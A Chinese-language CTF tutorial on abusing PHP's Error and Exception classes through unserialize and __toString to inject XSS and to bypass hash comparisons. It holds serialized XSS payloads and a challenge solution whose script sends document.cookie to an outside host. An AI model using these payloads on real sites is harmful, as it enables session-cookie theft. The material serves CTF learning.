## 前言
在CTF题目中，我多次遇到利用PHP原生类进行XSS、反序列化、SSRF以及XXE攻击的场景。我一直想深入研究这些技术，但由于种种原因一直未能如愿。今天终于有机会对这些PHP原生类进行总结。常见的几个PHP原生类包括：
- `Error`
- `Exception`
- `SoapClient`
- `DirectoryIterator`
- `SimpleXMLElement`

本文将分别讲解这些原生类在CTF中的应用。
> 如果文中存在不足之处，还请各位大佬多多指正。

## 使用 `Error` 和 `Exception` 内置类进行 XSS 攻击

### `Error` 内置类
- **适用版本**：PHP 7
- **条件**：开启报错的情况下

`Error` 类是PHP的一个内置类，用于自定义错误处理。在PHP 7环境下，如果开启了报错功能，可能会导致XSS漏洞。这是因为 `Error` 类中有一个 `__toString()` 方法，当对象被当作字符串输出时（例如使用 `echo`），会触发该方法。这为构造XSS提供了新的思路。

#### 示例代码
```php
// 反序列化函数
$payload = 'O:5:"Error":7:{s:10:"*message";s:25:"<script>alert(1)</script>";s:13:"Errorstring";s:0:"";s:7:"*code";i:0;s:7:"*file";s:18:"/usercode/file.php";s:7:"*line";i:2;s:12:"Errortrace";a:0:{}s:15:"Errorprevious";N;}';
unserialize($payload);
```

#### POC
```php
// 输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D
```

### `Exception` 内置类
- **适用版本**：PHP 5 和 PHP 7
- **条件**：开启报错的情况下

`Exception` 类与 `Error` 类类似，也有一个 `__toString()` 方法。当对象被当作字符串输出时，会触发该方法，从而可能引发XSS攻击。

#### 示例代码
```php
// 反序列化函数
$payload = 'O:9:"Exception":7:{s:10:"*message";s:25:"<script>alert(1)</script>";s:17:"Exceptionstring";s:0:"";s:7:"*code";i:0;s:7:"*file";s:18:"/usercode/file.php";s:7:"*line";i:2;s:16:"Exceptiontrace";a:0:{}s:19:"Exceptionprevious";N;}';
unserialize($payload);
```

#### POC
```php
// 输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
```

### [BJDCTF 2nd]xss之光
进入题目后，通过Git泄露获取到源码，得到以下Payload：
```php
/?yds_is_so_beautiful=O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A109%3A%22%3Cscript%3Ewindow.open%28%27http%3A%2F%2Fde28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn%2F%3F%27%2Bdocument.cookie%29%3B%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D
```

执行后，可以在cookie中获取到flag。

## 使用 `Error` 和 `Exception` 内置类绕过哈希比较
在上文中，我们已经介绍了 `Error` 和 `Exception` 这两个PHP内置类。除了用于XSS攻击外，它们还可以通过巧妙的构造绕过 `md5()` 和 `sha1()` 函数的比较。

### `Error` 类
- **引入版本**：PHP 7.0.0
- **属性**
  - `message`：错误消息内容
  - `code`：错误代码
  - `file`：抛出错误的文件名
  - `line`：抛出错误在该文件中的行数
- **方法**
  - `__construct`：初始化 error 对象
  - `getMessage`：获取错误信息
  - `getPrevious`：返回先前的 Throwable
  - `getCode`：获取错误代码
  - `getFile`：获取错误发生时的文件
  - `getLine`：获取错误发生时的行号
  - `getTrace`：获取调用栈
  - `getTraceAsString`：获取字符串形式的调用栈
  - `__toString`：error 的字符串表达
  - `__clone`：克隆 error

### `Exception` 类
- **引入版本**：PHP 5.0.0
- **属性**
  - `message`：异常消息内容
  - `code`：异常代码
  - `file`：抛出异常的文件名
  - `line`：抛出异常在该文件中的行号
- **方法**
  - `__construct`：异常构造函数
  - `getMessage`：获取异常消息内容
  - `getPrevious`：返回异常链中的前一个异常
  - `getCode`：获取异常代码
  - `getFile`：创建异常时的程序文件名称
  - `getLine`：获取创建的异常所在文件中的行号
  - `getTrace`：获取异常追踪信息
  - `getTraceAsString`：获取字符串类型的异常追踪信息
  - `__toString`：将异常对象转换为字符串
  - `__clone`：异常克隆

这两个类中都包含 `__toString` 方法，该方法用于将异常或错误对象转换为字符串。以下是一个简单的示例：

```php
<?php
$a = new Error("payload", 1);
echo $a;
```

输出如下：
```
Error: payload in /usercode/file.php:2
Stack trace:
```

通过这种方式，可以利用 `__toString` 方法绕过某些哈希比较。